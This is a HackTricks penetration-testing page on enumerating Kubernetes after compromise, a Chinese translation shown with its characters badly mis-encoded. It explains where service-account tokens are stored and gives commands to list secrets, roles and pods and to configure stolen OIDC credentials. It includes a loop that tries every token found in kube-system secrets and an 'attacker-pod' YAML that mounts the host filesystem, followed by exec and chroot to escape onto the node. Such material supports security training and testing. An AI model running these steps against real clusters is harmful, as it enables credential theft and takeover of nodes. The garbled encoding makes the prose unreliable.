# Kubernetes æšä¸¾

<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## Kubernetes ä»¤ç‰Œ

å¦‚æœæ‚¨å·²ç»ä¾µå…¥äº†ä¸€å°æœºå™¨ï¼Œç”¨æˆ·å¯èƒ½æœ‰æƒè®¿é—®æŸäº› Kubernetes å¹³å°ã€‚ä»¤ç‰Œé€šå¸¸ä½äº **env var `KUBECONFIG`** æŒ‡å‘çš„æ–‡ä»¶ä¸­æˆ– **`~/.kube`** å†…ã€‚

åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨å¯èƒ½ä¼šæ‰¾åˆ°å¸¦æœ‰**ä»¤ç‰Œå’Œé…ç½®ä»¥è¿æ¥åˆ° API æœåŠ¡å™¨**çš„é…ç½®æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ‚¨è¿˜å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç¼“å­˜æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«ä»¥å‰æ£€ç´¢çš„ä¿¡æ¯ã€‚

å¦‚æœæ‚¨å·²ç»ä¾µå…¥äº† Kubernetes ç¯å¢ƒä¸­çš„ä¸€ä¸ª podï¼Œè¿˜æœ‰å…¶ä»–åœ°æ–¹å¯ä»¥æ‰¾åˆ°ä»¤ç‰Œå’Œæœ‰å…³å½“å‰ K8 ç¯å¢ƒçš„ä¿¡æ¯ï¼š

### æœåŠ¡è´¦æˆ·ä»¤ç‰Œ

åœ¨ç»§ç»­ä¹‹å‰ï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“ Kubernetes ä¸­çš„æœåŠ¡æ˜¯ä»€ä¹ˆï¼Œæˆ‘å»ºè®®æ‚¨**ç‚¹å‡»æ­¤é“¾æ¥å¹¶è‡³å°‘é˜…è¯»æœ‰å…³ Kubernetes æ¶æ„çš„ä¿¡æ¯ã€‚**

æ‘˜è‡ª Kubernetes [æ–‡æ¡£](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server)ï¼š

_â€œå½“æ‚¨åˆ›å»ºä¸€ä¸ª pod æ—¶ï¼Œå¦‚æœæ‚¨æ²¡æœ‰æŒ‡å®šæœåŠ¡è´¦æˆ·ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ†é…åŒä¸€å‘½åç©ºé—´ä¸­çš„_é»˜è®¤_æœåŠ¡è´¦æˆ·ã€‚â€_

**ServiceAccount** æ˜¯ Kubernetes ç®¡ç†çš„ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨äºä¸ºåœ¨ pod ä¸­è¿è¡Œçš„è¿›ç¨‹æä¾›èº«ä»½ã€‚\
æ¯ä¸ªæœåŠ¡è´¦æˆ·éƒ½æœ‰ä¸€ä¸ªä¸ä¹‹ç›¸å…³çš„ç§˜å¯†ï¼Œè¿™ä¸ªç§˜å¯†åŒ…å«ä¸€ä¸ªæ‰¿è½½ä»¤ç‰Œã€‚è¿™æ˜¯ä¸€ä¸ª JSON Web ä»¤ç‰Œï¼ˆJWTï¼‰ï¼Œæ˜¯ä¸€ç§åœ¨ä¸¤æ–¹ä¹‹é—´å®‰å…¨è¡¨ç¤ºå£°æ˜çš„æ–¹æ³•ã€‚

é€šå¸¸ä»¥ä¸‹ç›®å½•ä¹‹ä¸€ï¼š

* `/run/secrets/kubernetes.io/serviceaccount`
* `/var/run/secrets/kubernetes.io/serviceaccount`
* `/secrets/kubernetes.io/serviceaccount`

åŒ…å«æ–‡ä»¶ï¼š

* **ca.crt**ï¼šå®ƒæ˜¯ç”¨äºæ£€æŸ¥ kubernetes é€šä¿¡çš„ ca è¯ä¹¦
* **namespace**ï¼šå®ƒæŒ‡ç¤ºå½“å‰å‘½åç©ºé—´
* **token**ï¼šå®ƒåŒ…å«å½“å‰ pod çš„**æœåŠ¡ä»¤ç‰Œ**ã€‚

ç°åœ¨æ‚¨æœ‰äº†ä»¤ç‰Œï¼Œæ‚¨å¯ä»¥åœ¨ç¯å¢ƒå˜é‡ **`KUBECONFIG`** ä¸­æ‰¾åˆ° API æœåŠ¡å™¨ã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·è¿è¡Œ `(env | set) | grep -i "kuber|kube`**`"`**

æœåŠ¡è´¦æˆ·ä»¤ç‰Œç”±ä½äºæ–‡ä»¶ **sa.key** ä¸­çš„å¯†é’¥ç­¾åï¼Œå¹¶ç”± **sa.pub** éªŒè¯ã€‚

**Kubernetes** ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /etc/kubernetes/pki

**Minikube** ä¸Šçš„é»˜è®¤ä½ç½®ï¼š

* /var/lib/localkube/certs

### çƒ­ Pods

_**çƒ­ Pods æ˜¯**_ åŒ…å«ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œçš„ podsã€‚ç‰¹æƒæœåŠ¡è´¦æˆ·ä»¤ç‰Œæ˜¯ä¸€ä¸ªæœ‰æƒé™æ‰§è¡Œç‰¹æƒä»»åŠ¡çš„ä»¤ç‰Œï¼Œä¾‹å¦‚åˆ—å‡ºç§˜å¯†ã€åˆ›å»º pods ç­‰ã€‚

## RBAC

å¦‚æœæ‚¨ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ **RBAC**ï¼Œ**è¯·é˜…è¯»æœ¬èŠ‚**ã€‚

## æšä¸¾å¤‡å¿˜å•

ä¸ºäº†æšä¸¾ K8s ç¯å¢ƒï¼Œæ‚¨éœ€è¦ä»¥ä¸‹å‡ ç‚¹ï¼š

* ä¸€ä¸ª**æœ‰æ•ˆçš„è®¤è¯ä»¤ç‰Œ**ã€‚åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†åœ¨å“ªé‡Œæœç´¢ç”¨æˆ·ä»¤ç‰Œå’ŒæœåŠ¡è´¦æˆ·ä»¤ç‰Œã€‚
* **åœ°å€ï¼ˆ**_**https://host:port**_**ï¼‰çš„ Kubernetes API**ã€‚è¿™é€šå¸¸å¯ä»¥åœ¨ç¯å¢ƒå˜é‡å’Œ/æˆ– kube é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚
* **å¯é€‰**ï¼š**ca.crt ä»¥éªŒè¯ API æœåŠ¡å™¨**ã€‚è¿™å¯ä»¥åœ¨å¯ä»¥æ‰¾åˆ°ä»¤ç‰Œçš„åŒä¸€åœ°æ–¹æ‰¾åˆ°ã€‚è¿™å¯¹äºéªŒè¯ API æœåŠ¡å™¨è¯ä¹¦å¾ˆæœ‰ç”¨ï¼Œä½†æ˜¯ä½¿ç”¨ `kubectl` çš„ `--insecure-skip-tls-verify` æˆ– `curl` çš„ `-k`ï¼Œæ‚¨å°†ä¸éœ€è¦è¿™ä¸ªã€‚

æœ‰äº†è¿™äº›ç»†èŠ‚ï¼Œæ‚¨å¯ä»¥**æšä¸¾ kubernetes**ã€‚å¦‚æœ**API** å‡ºäºæŸç§åŸå› å¯ä»¥é€šè¿‡**äº’è”ç½‘**è®¿é—®ï¼Œæ‚¨å¯ä»¥ä¸‹è½½è¯¥ä¿¡æ¯å¹¶ä»æ‚¨çš„ä¸»æœºæšä¸¾å¹³å°ã€‚

ç„¶è€Œï¼Œé€šå¸¸**API æœåŠ¡å™¨ä½äºå†…éƒ¨ç½‘ç»œä¸­**ï¼Œå› æ­¤æ‚¨éœ€è¦é€šè¿‡å—æŸæœºå™¨**åˆ›å»ºéš§é“**ä»¥ä»æ‚¨çš„æœºå™¨è®¿é—®å®ƒï¼Œæˆ–è€…æ‚¨å¯ä»¥**ä¸Šä¼ ** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæˆ–ä½¿ç”¨ **`curl/wget/anything`** æ‰§è¡Œå¯¹ API æœåŠ¡å™¨çš„åŸå§‹ HTTP è¯·æ±‚ã€‚

### `list` å’Œ `get` åŠ¨è¯ä¹‹é—´çš„åŒºåˆ«

ä½¿ç”¨ **`get`** æƒé™ï¼Œæ‚¨å¯ä»¥è®¿é—®ç‰¹å®šèµ„äº§çš„ä¿¡æ¯ï¼ˆ_`kubectl` ä¸­çš„ `describe` é€‰é¡¹_ï¼‰APIï¼š
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
å¦‚æœä½ æ‹¥æœ‰ **`list`** æƒé™ï¼Œä½ å¯ä»¥æ‰§è¡Œ API è¯·æ±‚æ¥åˆ—å‡ºä¸€ç§ç±»å‹çš„èµ„äº§ï¼ˆ_`kubectl` ä¸­çš„ `get` é€‰é¡¹_ï¼‰ï¼š
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
å¦‚æœä½ æ‹¥æœ‰ **`watch`** æƒé™ï¼Œä½ å¯ä»¥æ‰§è¡Œ API è¯·æ±‚æ¥ç›‘æ§èµ„äº§ï¼š
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
å®ƒä»¬æ‰“å¼€ä¸€ä¸ªæµè¿æ¥ï¼Œæ¯å½“ Deployment å‘ç”Ÿå˜åŒ–ï¼ˆæˆ–åˆ›å»ºæ–°çš„ Deployment æ—¶ï¼‰ï¼Œå°±ä¼šè¿”å›å®Œæ•´çš„æ¸…å•ã€‚

{% hint style="danger" %}
ä»¥ä¸‹çš„ `kubectl` å‘½ä»¤ä»…è¡¨ç¤ºå¦‚ä½•åˆ—å‡ºå¯¹è±¡ã€‚å¦‚æœä½ æƒ³è®¿é—®æ•°æ®ï¼Œéœ€è¦ä½¿ç”¨ `describe` è€Œä¸æ˜¯ `get`
{% endhint %}

### ä½¿ç”¨ curl

åœ¨ pod å†…éƒ¨ï¼Œä½ å¯ä»¥ä½¿ç”¨å‡ ä¸ªç¯å¢ƒå˜é‡ï¼š
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
{% hint style="warning" %}
é»˜è®¤æƒ…å†µä¸‹ï¼Œpod å¯ä»¥**è®¿é—®**åŸŸåä¸º **`kubernetes.default.svc`** çš„ **kube-api server**ï¼Œä½ å¯ä»¥åœ¨ **`/etc/resolv.config`** ä¸­çœ‹åˆ° kube ç½‘ç»œï¼Œå› ä¸ºè¿™é‡Œä½ ä¼šæ‰¾åˆ° kubernetes DNS æœåŠ¡å™¨çš„åœ°å€ï¼ˆåŒä¸€èŒƒå›´çš„â€œ.1â€æ˜¯ kube-api ç«¯ç‚¹ï¼‰ã€‚
{% endhint %}

### ä½¿ç”¨ kubectl

æ‹¥æœ‰ä»¤ç‰Œå’Œ API æœåŠ¡å™¨çš„åœ°å€åï¼Œä½ å¯ä»¥ä½¿ç”¨ kubectl æˆ– curl å¦‚ä¸‹æ‰€ç¤ºè®¿é—®å®ƒï¼š

é»˜è®¤æƒ…å†µä¸‹ï¼ŒAPISERVER é€šè¿‡ `https://` æ–¹æ¡ˆè¿›è¡Œé€šä¿¡
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```
> å¦‚æœ url ä¸­æ²¡æœ‰ `https://`ï¼Œä½ å¯èƒ½ä¼šæ”¶åˆ°åƒ Bad Request è¿™æ ·çš„é”™è¯¯ã€‚

ä½ å¯ä»¥åœ¨[**è¿™é‡Œæ‰¾åˆ°å®˜æ–¹çš„ kubectl é€ŸæŸ¥è¡¨**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)ã€‚ä»¥ä¸‹å„èŠ‚çš„ç›®æ ‡æ˜¯æŒ‰é¡ºåºä»‹ç»ä¸åŒçš„é€‰é¡¹ï¼Œä»¥æšä¸¾å’Œç†è§£ä½ è·å¾—è®¿é—®æƒé™çš„æ–° K8sã€‚

è¦æ‰¾åˆ° `kubectl` å‘é€çš„ HTTP è¯·æ±‚ï¼Œä½ å¯ä»¥ä½¿ç”¨å‚æ•° `-v=8`

#### MitM kubectl - ä»£ç†åŒ– kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### å½“å‰é…ç½®

{% tabs %}
{% tab title="Kubectl" %}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{% endtab %}
{% endtabs %}

å¦‚æœæ‚¨è®¾æ³•çªƒå–äº†ä¸€äº›ç”¨æˆ·å‡­è¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼ä»¥ä¸‹æ–¹æ³•åœ¨**æœ¬åœ°é…ç½®**å®ƒä»¬ï¼š
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### è·å–æ”¯æŒçš„èµ„æº

é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œæ‚¨å°†çŸ¥é“æ‰€æœ‰æ‚¨å¯ä»¥åˆ—å‡ºçš„æœåŠ¡

{% tabs %}
{% tab title="kubectl" %}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{% endtab %}
{% endtabs %}

### è·å–å½“å‰æƒé™

{% tabs %}
{% tab title="kubectl" %}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{% endtab %}
{% endtabs %}

å¦ä¸€ç§æ£€æŸ¥ä½ æƒé™çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·ï¼š[**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)****

ä½ å¯ä»¥åœ¨ä»¥ä¸‹å†…å®¹ä¸­äº†è§£æ›´å¤šå…³äº**Kubernetes RBAC**çš„ä¿¡æ¯ï¼š

{% content-ref url="kubernetes-role-based-access-control-rbac.md" %}
[kubernetes-role-based-access-control-rbac.md](kubernetes-role-based-access-control-rbac.md)
{% endcontent-ref %}

**ä¸€æ—¦ä½ çŸ¥é“äº†ä½ æ‹¥æœ‰å“ªäº›æƒé™**ï¼ŒæŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥äº†è§£**ä½ æ˜¯å¦å¯ä»¥æ»¥ç”¨è¿™äº›æƒé™**æ¥æå‡æƒé™ï¼š

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### è·å–å…¶ä»–è§’è‰²

{% tabs %}
{% tab title="kubectl" %}
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### è·å–å‘½åç©ºé—´

Kubernetes æ”¯æŒç”±åŒä¸€ä¸ªç‰©ç†é›†ç¾¤æ”¯æŒçš„**å¤šä¸ªè™šæ‹Ÿé›†ç¾¤**ã€‚è¿™äº›è™šæ‹Ÿé›†ç¾¤è¢«ç§°ä¸º**å‘½åç©ºé—´**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### è·å–ç§˜å¯†

{% tabs %}
{% tab title="kubectl" %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

å¦‚æœæ‚¨èƒ½è¯»å–ç§˜å¯†ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¡Œæ¥è·å–ä¸æ¯ä¸ªä»¤ç‰Œç›¸å…³çš„æƒé™ï¼š
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### è·å–æœåŠ¡è´¦æˆ·

å¦‚æœ¬é¡µå¼€å¤´æ‰€è®¨è®ºçš„ï¼Œ**å½“è¿è¡Œä¸€ä¸ª pod æ—¶ï¼Œé€šå¸¸ä¼šä¸ºå…¶åˆ†é…ä¸€ä¸ªæœåŠ¡è´¦æˆ·**ã€‚å› æ­¤ï¼Œåˆ—å‡ºæœåŠ¡è´¦æˆ·ã€å®ƒä»¬çš„æƒé™ä»¥åŠå®ƒä»¬çš„è¿è¡Œä½ç½®å¯èƒ½å…è®¸ç”¨æˆ·æå‡æƒé™ã€‚

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### è·å–éƒ¨ç½²

éƒ¨ç½²æŒ‡å®šäº†éœ€è¦**è¿è¡Œ**çš„**ç»„ä»¶**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### è·å– Pods

Pods æ˜¯å®é™…å°†è¦**è¿è¡Œ**çš„**å®¹å™¨**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### è·å–æœåŠ¡

Kubernetes **æœåŠ¡**ç”¨äº**åœ¨ç‰¹å®šç«¯å£å’ŒIPä¸Šæš´éœ²æœåŠ¡**ï¼ˆå®ƒå°†ä½œä¸ºè´Ÿè½½å‡è¡¡å™¨å¯¹å®é™…æä¾›æœåŠ¡çš„podsè¿›è¡Œæ“ä½œï¼‰ã€‚äº†è§£åœ¨å“ªé‡Œå¯ä»¥æ‰¾åˆ°å…¶ä»–æœåŠ¡ä»¥å°è¯•æ”»å‡»æ˜¯å¾ˆæœ‰è¶£çš„ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### è·å–èŠ‚ç‚¹

è·å–é›†ç¾¤å†…**é…ç½®çš„æ‰€æœ‰èŠ‚ç‚¹**ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### è·å– DaemonSets

**DaemonSets** ç¡®ä¿**ç‰¹å®šçš„ pod åœ¨é›†ç¾¤çš„æ‰€æœ‰èŠ‚ç‚¹ä¸Šè¿è¡Œ**ï¼ˆæˆ–åœ¨é€‰å®šçš„èŠ‚ç‚¹ä¸Šï¼‰ã€‚å¦‚æœä½ åˆ é™¤ DaemonSetï¼Œå®ƒç®¡ç†çš„ pods ä¹Ÿä¼šè¢«ç§»é™¤ã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### è·å– cronjob

Cron jobs å…è®¸ä½¿ç”¨ crontab ç±»ä¼¼çš„è¯­æ³•æ¥å®‰æ’å¯åŠ¨ podï¼Œè¯¥ pod å°†æ‰§è¡ŒæŸäº›æ“ä½œã€‚

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### è·å– configMap

configMap æ€»æ˜¯åŒ…å«è®¸å¤šä¿¡æ¯å’Œé…ç½®æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æä¾›ç»™åœ¨ kubernetes ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºã€‚é€šå¸¸ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°è®¸å¤šç”¨äºè¿æ¥å’ŒéªŒè¯å…¶ä»–å†…éƒ¨/å¤–éƒ¨æœåŠ¡çš„å¯†ç ã€ç§˜å¯†ã€ä»¤ç‰Œã€‚

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% endtab %}

{% endtabs %}


### è·å– "all"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **è·å– Pods æ¶ˆè€—æƒ…å†µ**

{% tabs %}
{% tab title="kubectl" %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### ä» pod é€ƒé€¸

å¦‚æœæ‚¨èƒ½å¤Ÿåˆ›å»ºæ–°çš„ podï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿä»å®ƒä»¬é€ƒé€¸åˆ°èŠ‚ç‚¹ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦ä½¿ç”¨ yaml æ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°çš„ podï¼Œåˆ‡æ¢åˆ°åˆ›å»ºçš„ podï¼Œç„¶åä½¿ç”¨ chroot è¿›å…¥èŠ‚ç‚¹çš„ç³»ç»Ÿã€‚æ‚¨å¯ä»¥ä½¿ç”¨å·²ç»å­˜åœ¨çš„ pod ä½œä¸º yaml æ–‡ä»¶çš„å‚è€ƒï¼Œå› ä¸ºå®ƒä»¬æ˜¾ç¤ºäº†ç°æœ‰çš„é•œåƒå’Œè·¯å¾„ã€‚
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> å¦‚æœæ‚¨éœ€è¦åœ¨ç‰¹å®šèŠ‚ç‚¹ä¸Šåˆ›å»º podï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è·å–èŠ‚ç‚¹ä¸Šçš„æ ‡ç­¾
>
> `k get nodes --show-labels`
>
> é€šå¸¸ï¼Œkubernetes.io/hostname å’Œ node-role.kubernetes.io/master éƒ½æ˜¯é€‰æ‹©çš„å¥½æ ‡ç­¾ã€‚
>
> [å‚è€ƒèµ„æ–™]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

ç„¶åæ‚¨åˆ›å»ºæ‚¨çš„ attack.yaml æ–‡ä»¶
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
```markdown
[åŸå§‹ YAML æºç ](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ä¹‹åä½ åˆ›å»º pod
```
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
ç°åœ¨æ‚¨å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼åˆ‡æ¢åˆ°åˆ›å»ºçš„ podï¼š
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
æœ€åï¼Œä½ ä½¿ç”¨ chroot è¿›å…¥èŠ‚ç‚¹çš„ç³»ç»Ÿ
```bash
chroot /root /bin/bash
```
ä»ä»¥ä¸‹èµ„æºè·å–çš„ä¿¡æ¯ï¼š[Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [æ”»å‡»ä¸é˜²å¾¡ Kubernetes: Bust-A-Kube â€“ ç¬¬1é›†](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## å‚è€ƒèµ„æ–™

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF** ç‰ˆæœ¬ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)ç³»åˆ—
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
